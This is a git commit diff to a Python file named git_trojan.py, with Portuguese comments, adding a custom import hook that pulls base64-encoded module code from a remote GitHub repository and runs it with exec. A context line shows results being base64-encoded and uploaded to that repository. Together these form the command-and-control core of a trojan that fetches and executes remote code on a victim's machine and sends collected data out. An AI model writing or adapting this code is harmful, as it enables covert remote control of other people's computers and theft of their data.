e3fefd6e5a9041598f659c181480f2f411135517
bit <bit@localhost.localdomain>
2016-12-28 13:29:48 -0200

    Update file

--- git_trojan.py
+++ git_trojan.py
@@ -56,3 +56,35 @@ def store_module_result(data):
     repo.create_file(remote_path, 'Commit message', base64.b64encode(data))
 
     return
+
+
+class GitImporter(object):
+    def __init__(self):
+        self.current_module_code = ''
+
+    def find_module(self, fullname, path=None):
+        #global configured
+
+        if configured:
+            print '[*] Attempting to retrieve %s' % fullname
+            # Carregador de arquivo remoto
+            new_library = get_file_content('modules/%s' % fullname)
+
+            if new_library is not None:
+                # Carregamos em nossa classe
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+
+        return None
+
+
+    def load_module(self, name):
+        # Cria um objeto modulo vazio
+        module = imp.new_module(name)
+        # Insere nele o codigo obtido pelo GitHub
+        exec self.current_module_code in module.__dict__
+        # Insere o modulo recem-criado na lista sys.modules,
+        # para ser acessado por qualquer chamada import no futuro
+        sys.modules[name] = module
+
+        return module
